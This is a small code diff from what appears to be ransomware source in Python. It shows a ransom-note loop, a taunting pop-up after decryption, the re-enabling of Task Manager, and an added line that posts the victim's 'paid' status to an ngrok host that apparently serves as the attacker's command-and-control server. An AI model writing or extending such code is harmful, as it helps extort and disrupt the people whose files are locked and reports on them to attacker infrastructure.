@@ -9,7 +9,6 @@ if __name__ == '__main__':
         print('Nothing to do here')
         sys.exit()
 
-
     ransom_note = RansomNote()
     while True:
         try:
@@ -39,4 +38,5 @@ if __name__ == '__main__':
     print('All data was successfully decrypted')
     purple_pop_up(text="All data was decrypted successfully. Be careful on the internet next time ;)")
 
+    cm.send_post_request(url='http://4b91c7321c2a.ngrok.io', mode='update', state='paid')
     cm.enable_task_manager()
